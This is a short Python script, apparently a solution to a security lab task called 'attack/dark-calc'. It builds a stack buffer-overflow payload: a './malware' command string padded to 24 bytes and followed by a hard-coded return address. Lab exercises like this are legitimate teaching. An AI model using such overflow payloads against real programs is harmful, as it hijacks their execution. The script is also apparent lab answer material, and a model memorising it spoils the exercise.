#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct

cmd = b"./malware\x00"
payload = cmd + b"A" * (24 - len(cmd))
target_addr = 0x401a6b 
payload += struct.pack("<Q", target_addr)

sys.stdout.buffer.write(payload)
